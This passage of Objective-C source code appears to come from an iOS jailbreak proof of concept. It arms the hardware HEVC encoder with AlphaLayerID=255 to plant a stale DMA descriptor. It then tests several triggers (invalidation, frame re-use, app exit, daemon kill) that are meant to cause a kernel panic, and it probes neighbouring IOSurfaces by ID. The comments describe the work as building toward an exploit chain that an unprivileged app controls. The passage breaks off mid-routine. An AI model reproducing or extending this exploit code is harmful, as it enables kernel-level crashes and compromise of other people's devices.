            pocLog(@"");

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            session = NULL;

            LOG(@"Session invalidated at %@. Waiting 60s...", [fmt stringFromDate:[NSDate date]]);
            idleWait(60, @"post-invalidate DART window (Run A)");

            PASS(@"=== RUN A: SURVIVED 60s post-invalidate ===");
            INFO(@"Teardown did NOT trigger the fault immediately.");
            INFO(@"Next press: Run B (clean encode on same session)");
            break;
        }
        case 1: {
            // Run B: Encode a clean frame on the SAME session, then wait
            LOG(@"=== RUN B: CLEAN ENCODE ON SAME SESSION ===");
            INFO(@"Session still alive. Encoding with AlphaLayerID=0...");
            INFO(@"If panic fires → descriptor fires on next-use/flush.");
            pocLog(@"");

            CVPixelBufferRef pb2 = createTestPixelBuffer(320, 240);
            if (pb2) {
                g_narrowGotOutput = NO;
                g_oracleContext = @"teardown-clean";
                OSStatus encStatus = VTCompressionSessionEncodeFrame(session, pb2,
                    CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
                INFO(@"Clean encode: %d (%s)", (int)encStatus,
                    encStatus == noErr ? "submitted" : "error");
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                [NSThread sleepForTimeInterval:2.0];
                INFO(@"Clean encode output: %@", g_narrowGotOutput ? @"YES" : @"NO");
                CVPixelBufferRelease(pb2);
            } else {
                FAIL(@"Could not create pixel buffer for clean encode");
            }

            LOG(@"Clean encode done at %@. Waiting 60s...", [fmt stringFromDate:[NSDate date]]);
            idleWait(60, @"post-clean-encode DART window (Run B)");

            PASS(@"=== RUN B: SURVIVED 60s post-clean-encode ===");
            INFO(@"Next-use did NOT trigger the fault.");
            INFO(@"Next press: Run C (idle baseline)");

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            session = NULL;
            break;
        }
        case 2: {
            // Run C: Leave session alive, just idle (baseline comparison)
            LOG(@"=== RUN C: IDLE BASELINE (session alive) ===");
            INFO(@"Session NOT invalidated. Pure idle wait 180s.");
            INFO(@"If panic fires → idle timer / power-state trigger.");
            pocLog(@"");

            idleWait(180, @"idle DART window with live session (Run C)");

            PASS(@"=== RUN C: SURVIVED 180s idle ===");
            INFO(@"Now invalidating session...");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            session = NULL;

            LOG(@"Session invalidated. Waiting 60s post-invalidate...");
            idleWait(60, @"post-invalidate after idle (Run C)");

            PASS(@"=== RUN C: SURVIVED 60s post-invalidate too ===");
            INFO(@"Cycle complete. Press Teardown to restart A→B→C.");
            break;
        }
    }

    if (session) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }

    pocLog(@"");
    INFO(@"RESULT: Run %@ completed without panic.", runLabel);
    INFO(@"Record result. Compare A/B/C panic rates to identify trigger.");
    pocLog(@"");

    g_phase2Running = NO;
}

// ============================================================
// Run B v2: Frame-by-frame DART re-use test
// Arms with Alpha=255, then encodes clean frames one at a time
// on the SAME session to trigger synchronous DART cleanup path
// via AVE_EncodeSubmit_TriggerCleanup (+0xf8 gate stays open
// after -17691 firmware error).
// ============================================================

static void runRunB_v2(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  RUN B v2: Frame-by-Frame DART Re-use    ║");
    pocLog(@"║  Alpha=255 arm → clean encode × 10       ║");
    pocLog(@"║  Tests synchronous cleanup path (+0xf8)  ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss.SSS";

    // Step 1: Canary encode to verify AVE2 is healthy
    LOG(@"--- STEP 1: CANARY (AlphaLayerID=0) ---");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK — encoder healthy.");
    idleWait(10, @"canary cooldown");

    // Step 2: Create session and arm with Alpha=255
    LOG(@"--- STEP 2: ARM with AlphaLayerID=255 ---");
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        g_phase2Running = NO;
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer failed");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = @"runB-v2-arm";

    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming) ***");
    LOG(@"ARM time: %@", [fmt stringFromDate:[NSDate date]]);
    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d (%s)", (int)status,
        status == noErr ? "submitted" : "error");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    BOOL armed = !g_narrowGotOutput;
    INFO(@"Callback output: %@ (expect NO for -17691 path)",
        g_narrowGotOutput ? @"YES" : @"NO");
    CVPixelBufferRelease(pb);

    if (!armed) {
        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
    } else {
        PASS(@"Armed: -17691 error path taken. +0xf8 should still be 1.");
    }
    pocLog(@"");

    // Step 3: Switch to Alpha=0 and encode clean frames one at a time
    LOG(@"--- STEP 3: CLEAN ENCODE x10 (same session, Alpha=0) ---");
    INFO(@"Session NOT invalidated. +0xf8 gate should still be open.");
    INFO(@"Each encode triggers AVE_EncodeSubmit_TriggerCleanup.");
    INFO(@"If stale DART descriptor fires -> panic during encode.");
    pocLog(@"");

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(0));
    INFO(@"SET AlphaLayerID=0: %s (switched to clean)",
        status == noErr ? "OK" : "REJECTED");
    pocLog(@"");

    int completedFrames = 0;
    for (int frame = 1; frame <= 10; frame++) {
        LOG(@"=== FRAME %d/10 at %@ ===",
            frame, [fmt stringFromDate:[NSDate date]]);

        CVPixelBufferRef framePb = createTestPixelBuffer(320, 240);
        if (!framePb) {
            FAIL(@"Frame %d: pixel buffer failed", frame);
            break;
        }

        g_narrowGotOutput = NO;
        g_oracleContext = [NSString stringWithFormat:@"runB-v2-f%d", frame];

        OSStatus encStatus = VTCompressionSessionEncodeFrame(
            session, framePb,
            CMTimeMake(frame, 30), kCMTimeInvalid, NULL, NULL, NULL);
        INFO(@"Frame %d encode: %d (%s)", frame, (int)encStatus,
            encStatus == noErr ? "submitted" : "error");

        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        [NSThread sleepForTimeInterval:2.0];

        INFO(@"Frame %d output: %@ at %@", frame,
            g_narrowGotOutput ? @"YES" : @"NO (error)",
            [fmt stringFromDate:[NSDate date]]);
        CVPixelBufferRelease(framePb);

        if (encStatus != noErr) {
            FAIL(@"Frame %d: encode error %d — session dead?",
                frame, (int)encStatus);
            break;
        }
        completedFrames = frame;

        if (frame < 10) {
            INFO(@"Waiting 10s before frame %d...", frame + 1);
            for (int s = 10; s > 0; s--) {
                if (s <= 3 || s % 5 == 0) {
                    INFO(@"  ... %ds", s);
                }
                [NSThread sleepForTimeInterval:1.0];
            }
        }
        pocLog(@"");
    }

    // Step 4: Results
    pocLog(@"");
    LOG(@"=== RUN B v2 RESULTS at %@ ===", [fmt stringFromDate:[NSDate date]]);

    if (completedFrames < 10) {
        FAIL(@"Session died at frame %d — possible DART fault on re-use!",
            completedFrames + 1);
        INFO(@"Deferred descriptor may have fired during encode submission.");
    } else {
        PASS(@"All 10 frames survived — no synchronous DART fault.");
        INFO(@"Descriptor did NOT fire on encode re-use.");
        INFO(@"Either: (a) cleanup on -17691 path, or");
        INFO(@"        (b) stale descriptor needs different trigger.");
    }
    pocLog(@"");

    // Cleanup
    LOG(@"Invalidating session...");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    LOG(@"Post-invalidate wait 30s (catch teardown-triggered fault)...");
    idleWait(30, @"post-Run-B-v2 teardown window");

    PASS(@"=== RUN B v2 COMPLETE ===");
    INFO(@"Record: armed=%@, frames=%d/10",
        armed ? @"YES" : @"NO", completedFrames);
    pocLog(@"");

    g_phase2Running = NO;
}

// ============================================================
// Run C1: Client-death fire-control test (app-side only)
//
// Tests the AVE_ClientClose path: app death drops XPC connection
// to videocodecd → kext client count hits zero → AVE_SessionDestroy
// → AVE_SurfaceMgr_Cleanup → ReleaseDelayed → DARTUnmapSurface_TwoPhase
// → stale descriptor fires into unmapped DVA → DART fault.
//
// CRITICAL: session is NOT invalidated before exit. The armed session
// is alive when the process dies, so XPC drop is the ONLY trigger.
// Invalidating first would be Run A territory again.
//
// If panic fires within seconds of exit(0): unprivileged app alone
// controls fire timing. Best possible outcome for the exploit chain.
// ============================================================

static void runRunC1(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    os_log_t runcLog = os_log_create("com.jbpoc.runc", "fire-control");

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  RUN C1: Client-Death Fire-Control        ║");
    pocLog(@"║  Alpha=255 arm → NO invalidate → exit(0)  ║");
    pocLog(@"║  Tests: AVE_ClientClose path (Ghidra #3)  ║");
    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss.SSS";

    // Step 1: Canary
    LOG(@"--- STEP 1: CANARY (AlphaLayerID=0) ---");
    os_log(runcLog, "JBPoC-RUN-C1-CANARY-START");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        os_log_error(runcLog, "JBPoC-RUN-C1-CANARY-FAILED");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK — encoder healthy.");
    idleWait(5, @"canary cooldown");

    // Step 2: Arm with Alpha=255 — keep session alive
    LOG(@"--- STEP 2: ARM with AlphaLayerID=255 ---");
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        g_phase2Running = NO;
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer failed");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = @"runC1-arm";

    NSString *armTime = [fmt stringFromDate:[NSDate date]];
    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming stale DMA descriptor) ***");
    LOG(@"ARM time: %@", armTime);
    os_log(runcLog, "JBPoC-RUN-C1-ARM %{public}@", armTime);

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d (%s)", (int)status,
        status == noErr ? "submitted" : "error");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    BOOL armed = !g_narrowGotOutput;
    INFO(@"Callback output: %@ (expect NO for -17691 path)",
        g_narrowGotOutput ? @"YES" : @"NO");
    CVPixelBufferRelease(pb);

    if (!armed) {
        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
        os_log(runcLog, "JBPoC-RUN-C1-ARM-WARNING not-armed");
    } else {
        PASS(@"Armed: -17691 error path taken. Stale DMA descriptor planted.");
        os_log(runcLog, "JBPoC-RUN-C1-ARMED confirmed");
    }
    pocLog(@"");

    // Step 3: NO INVALIDATE — exit with session alive
    LOG(@"--- STEP 3: EXIT (session NOT invalidated) ---");
    INFO(@"Session deliberately kept alive. XPC drop on exit is the");
    INFO(@"sole trigger for AVE_ClientClose → count==0 → teardown.");
    pocLog(@"");

    // Write state file before exit (survives app death)
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:docs
        withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *stateFile = [docs stringByAppendingPathComponent:@"runc1_state.txt"];
    NSString *exitTime = [fmt stringFromDate:[NSDate date]];
    NSString *stateData = [NSString stringWithFormat:
        @"RUN-C1 state\narmed_at=%@\nexit_at=%@\narmed=%@\nsession_invalidated=NO\n",
        armTime, exitTime, armed ? @"YES" : @"NO"];
    [stateData writeToFile:stateFile atomically:YES
        encoding:NSUTF8StringEncoding error:nil];
    int fd = open([stateFile UTF8String], O_RDONLY);
    if (fd >= 0) { fsync(fd); close(fd); }

    LOG(@"State written to %@", stateFile);
    LOG(@"ARM: %@  EXIT: %@", armTime, exitTime);
    pocLog(@"");

    // os_log markers — these survive in syslog after app death
    os_log(runcLog, "JBPoC-RUN-C1-EXIT arm=%{public}@ exit=%{public}@", armTime, exitTime);
    NSLog(@"JBPoC-RUN-C1-EXIT arm=%@ exit=%@", armTime, exitTime);

    // Tiny pause so logs flush to syslog daemon
    [NSThread sleepForTimeInterval:0.3];

    os_log(runcLog, "JBPoC-RUN-C1-EXIT-NOW");

    exit(0);
}

// ============================================================
// Run C2: Forced daemon-death test (needs Mac-side kill)
//
// Tests the discriminating prediction of the unified model:
// if daemon death (not client death) unmaps the surface, C2
// fires within seconds of the external kill regardless of
// app state.
//
// Protocol: arm → app stays alive holding the session → log
// timestamps in a loop → user kills videocodecd from Mac
// (lldb attach + kill, or Xcode process kill) → watch for panic.
//
// The session is NOT invalidated. App holds XPC connection alive.
// Only the external daemon kill triggers the teardown.
// ============================================================

static void runRunC2(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    os_log_t runcLog = os_log_create("com.jbpoc.runc", "fire-control");

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  RUN C2: Forced Daemon-Death Test         ║");
    pocLog(@"║  Alpha=255 arm → hold session → wait      ║");
    pocLog(@"║  Kill videocodecd from Mac when prompted   ║");
    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss.SSS";

    // Step 1: Canary
    LOG(@"--- STEP 1: CANARY ---");
    os_log(runcLog, "JBPoC-RUN-C2-CANARY-START");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK.");
    idleWait(5, @"canary cooldown");

    // Step 2: Arm — keep session alive, NO invalidation
    LOG(@"--- STEP 2: ARM (session held open) ---");
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        g_phase2Running = NO;
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer failed");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        g_phase2Running = NO;
        return;
    }

    g_narrowGotOutput = NO;
    g_oracleContext = @"runC2-arm";

    NSString *armTime = [fmt stringFromDate:[NSDate date]];
    LOG(@"ARM time: %@", armTime);
    os_log(runcLog, "JBPoC-RUN-C2-ARM %{public}@", armTime);

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d (%s)", (int)status,
        status == noErr ? "submitted" : "error");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    BOOL armed = !g_narrowGotOutput;
    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
    CVPixelBufferRelease(pb);
    os_log(runcLog, "JBPoC-RUN-C2-ARMED %{public}@", armed ? @"YES" : @"NO");

    if (!armed) {
        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
    }
    pocLog(@"");

    // Step 3: Hold session, wait for external kill
    LOG(@"--- STEP 3: WAITING — SESSION HELD OPEN ---");
    LOG(@"Session NOT invalidated. App holding XPC connection alive.");
    pocLog(@"");
    LOG(@"╔══════════════════════════════════════════════════╗");
    LOG(@"║  KILL videocodecd FROM MAC NOW!                   ║");
    LOG(@"║                                                   ║");
    LOG(@"║  Option A (Xcode):                                ║");
    LOG(@"║    Debug > Attach to Process > videocodecd        ║");
    LOG(@"║    Then: Debug > Detach (or kill via lldb)        ║");
    LOG(@"║                                                   ║");
    LOG(@"║  Option B (lldb from terminal):                   ║");
    LOG(@"║    xcrun lldb                                     ║");
    LOG(@"║    platform select remote-ios                     ║");
    LOG(@"║    process attach --name videocodecd              ║");
    LOG(@"║    kill                                           ║");
    LOG(@"║                                                   ║");
    LOG(@"║  Option C (if SSH/root available):                ║");
    LOG(@"║    killall videocodecd                            ║");
    LOG(@"╚══════════════════════════════════════════════════╝");
    pocLog(@"");

    LOG(@"Continuous timing — last line before panic is the fire delay:");
    LOG(@"ARM: %@", armTime);
    os_log(runcLog, "JBPoC-RUN-C2-WAIT-START arm=%{public}@", armTime);
    pocLog(@"");

    for (int s = 1; s <= 300; s++) {
        [NSThread sleepForTimeInterval:1.0];
        NSString *now = [fmt stringFromDate:[NSDate date]];
        if (s <= 30 || s % 10 == 0) {
            LOG(@"T+%03ds: %@ — alive", s, now);
        }
        if (s % 30 == 0) {
            os_log(runcLog, "JBPoC-RUN-C2-ALIVE T+%ds %{public}@", s, now);
        }
    }

    pocLog(@"");
    PASS(@"=== RUN C2: NO PANIC IN 5 MIN ===");
    INFO(@"ARM: %@", armTime);
    INFO(@"videocodecd was not killed, or daemon death doesn't");
    INFO(@"trigger the unmap while app holds XPC connection.");
    os_log(runcLog, "JBPoC-RUN-C2-NO-PANIC arm=%{public}@", armTime);

    // Clean up since we're still alive
    LOG(@"Cleaning up session...");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    g_phase2Running = NO;
}

// ============================================================
// D-PREP: In-place readout — test Model (b)
//
// Model (b): firmware writes through the stale descriptor CONTINUOUSLY
// while the PTE is valid. We just haven't looked. The panic only appears
// at teardown because that's when the mapping goes away.
//
// Test: arm Alpha=255, keep session alive, snapshot the input pixel
// buffer + any output surfaces, then re-read at intervals through the
// ~160s idle-timer window. If any bytes change → firmware DMA is already
// writing into our mapped surfaces. No race needed.
// ============================================================

static void runDPrep(void) {
    if (g_phase2Running) {
        INFO(@"Phase 2 test already running — wait for it.");
        return;
    }
    g_phase2Running = YES;

    os_log_t dLog = os_log_create("com.jbpoc.dprep", "readout");

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════════╗");
    pocLog(@"║  D-PREP: In-Place Surface Readout         ║");
    pocLog(@"║  Model (b) test — is firmware already     ║");
    pocLog(@"║  writing into our mapped surfaces?        ║");
    pocLog(@"║  *** WILL PANIC ~160s after run ends ***  ║");
    pocLog(@"║  (invalidation IS a teardown/unmap path   ║");
    pocLog(@"║   — same as Run A. Keep the .ips!)        ║");
    pocLog(@"╚══════════════════════════════════════════╝");
    pocLog(@"");

    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss.SSS";

    // Step 1: Canary
    LOG(@"--- STEP 1: CANARY ---");
    os_log(dLog, "JBPoC-DPREP-CANARY-START");
    BOOL canary = phase2Encode(0, @"CANARY");
    if (!canary) {
        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
        g_phase2Running = NO;
        return;
    }
    PASS(@"CANARY OK.");
    idleWait(5, @"canary cooldown");

    // Step 2: Create the input pixel buffer — this is the surface the firmware sees
    LOG(@"--- STEP 2: CREATE SURFACES & SNAPSHOT ---");
    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
    if (!pb) {
        FAIL(@"Pixel buffer creation failed");
        g_phase2Running = NO;
        return;
    }

    // Snapshot the input surface BEFORE arming
    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    size_t ySize = yH * yBpr;
    size_t uvH = CVPixelBufferGetHeightOfPlane(pb, 1);
    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
    size_t uvSize = uvH * uvBpr;
    size_t totalSize = ySize + uvSize;

    uint8_t *yBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    uint8_t *uvBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);

    uint8_t *snapshot = (uint8_t *)malloc(totalSize);
    if (!snapshot) {
        FAIL(@"malloc snapshot failed");
        CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
        CVPixelBufferRelease(pb);
        g_phase2Running = NO;
        return;
    }
    memcpy(snapshot, yBase, ySize);
    memcpy(snapshot + ySize, uvBase, uvSize);
    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);

    INFO(@"Input surface: Y %zux%zu (%zu bytes, bpr=%zu) + UV %zux%zu (%zu bytes, bpr=%zu)",
         CVPixelBufferGetWidthOfPlane(pb, 0), yH, ySize, yBpr,
         CVPixelBufferGetWidthOfPlane(pb, 1), uvH, uvSize, uvBpr);
    INFO(@"Total snapshot: %zu bytes (0x%zx)", totalSize, totalSize);
    os_log(dLog, "JBPoC-DPREP-SNAPSHOT total=%zu ySize=%zu uvSize=%zu", totalSize, ySize, uvSize);

    // Compute initial CRC32 for quick comparison
    uint32_t initCrcY = 0;
    for (size_t i = 0; i < ySize; i++) initCrcY = (initCrcY << 1) ^ snapshot[i];
    uint32_t initCrcUV = 0;
    for (size_t i = 0; i < uvSize; i++) initCrcUV = (initCrcUV << 1) ^ snapshot[ySize + i];
    INFO(@"Initial checksums: Y=0x%08x UV=0x%08x", initCrcY, initCrcUV);

    // Also get the IOSurface backing info
    IOSurfaceRef iosurf = CVPixelBufferGetIOSurface(pb);
    if (iosurf) {
        uint32_t surfID = IOSurfaceGetID(iosurf);
        size_t allocSize = IOSurfaceGetAllocSize(iosurf);
        size_t planeCount = IOSurfaceGetPlaneCount(iosurf);
        INFO(@"IOSurface ID=%u allocSize=%zu planes=%zu", surfID, allocSize, planeCount);
        os_log(dLog, "JBPoC-DPREP-IOSURFACE id=%u alloc=%zu planes=%zu", surfID, allocSize, planeCount);
    } else {
        INFO(@"WARNING: No IOSurface backing — CVPixelBuffer not IOSurface-backed?");
    }

    // Step 3: ARM — create session with Alpha=255, submit encode, keep session alive
    LOG(@"--- STEP 3: ARM Alpha=255 ---");
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        narrowCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        free(snapshot);
        CVPixelBufferRelease(pb);
        g_phase2Running = NO;
        return;
    }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(255));
    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        free(snapshot);
        CVPixelBufferRelease(pb);
        g_phase2Running = NO;
        return;
    }

    // Step 3b: Scan for IOSurfaces visible to this process
    // NOTE: encode runs in videocodecd — its DARTMapInternalSurfaces allocations
    // (bitstream pool, control rings) are in the daemon's namespace and won't appear
    // in IOSurfaceLookup from this app. This scan only finds app-side external surfaces.
    // If the stale descriptor targets an internal surface, this scan finds nothing —
    // that's expected, not a bug. Interpret null accordingly.
    LOG(@"--- STEP 3b: SCAN IOSurface NEIGHBORHOOD ---");
    LOG(@"(App-visible only — daemon internal surfaces won't appear)");

    uint32_t inputSurfID = 0;
    IOSurfaceRef inputSurf = CVPixelBufferGetIOSurface(pb);
    if (inputSurf) inputSurfID = IOSurfaceGetID(inputSurf);

    #define DPREP_MAX_EXTRA_SURFS 32
    IOSurfaceRef extraSurfs[DPREP_MAX_EXTRA_SURFS];
    uint32_t extraSurfIDs[DPREP_MAX_EXTRA_SURFS];
    uint8_t *extraSnapshots[DPREP_MAX_EXTRA_SURFS];
    size_t extraSizes[DPREP_MAX_EXTRA_SURFS];
    int extraCount = 0;

    // Scan IDs from (inputSurfID - 8) to (inputSurfID + 32)
    uint32_t scanStart = (inputSurfID > 8) ? (inputSurfID - 8) : 1;
    uint32_t scanEnd = inputSurfID + 32;

    for (uint32_t sid = scanStart; sid <= scanEnd && extraCount < DPREP_MAX_EXTRA_SURFS; sid++) {
        if (sid == inputSurfID) continue; // skip our own input surface
        IOSurfaceRef surf = IOSurfaceLookup(sid);
        if (!surf) continue;

        size_t allocSz = IOSurfaceGetAllocSize(surf);
        size_t planeCount = IOSurfaceGetPlaneCount(surf);
        size_t w2 = IOSurfaceGetWidth(surf);
        size_t h2 = IOSurfaceGetHeight(surf);

        INFO(@"  Found IOSurface ID=%u: %zux%zu alloc=%zu planes=%zu",
             sid, w2, h2, allocSz, planeCount);

        // Lock and snapshot this surface
        IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
        void *base = IOSurfaceGetBaseAddress(surf);
        if (base && allocSz > 0 && allocSz < 4*1024*1024) {
            uint8_t *snap = (uint8_t *)malloc(allocSz);
            if (snap) {
                memcpy(snap, base, allocSz);
                extraSurfs[extraCount] = surf;
                extraSurfIDs[extraCount] = sid;
                extraSnapshots[extraCount] = snap;
                extraSizes[extraCount] = allocSz;
                extraCount++;
            }
        }
        IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);

        if (base == NULL || allocSz == 0) {
            CFRelease(surf);
        }
    }

    INFO(@"Monitoring %d extra IOSurfaces + 1 input surface = %d total", extraCount, extraCount + 1);
    os_log(dLog, "JBPoC-DPREP-SURFACES input=%u extras=%d", inputSurfID, extraCount);

    g_narrowGotOutput = NO;
    g_oracleContext = @"dprep-arm";

    NSString *armTime = [fmt stringFromDate:[NSDate date]];
    LOG(@"ARM time: %@", armTime);
    os_log(dLog, "JBPoC-DPREP-ARM %{public}@", armTime);

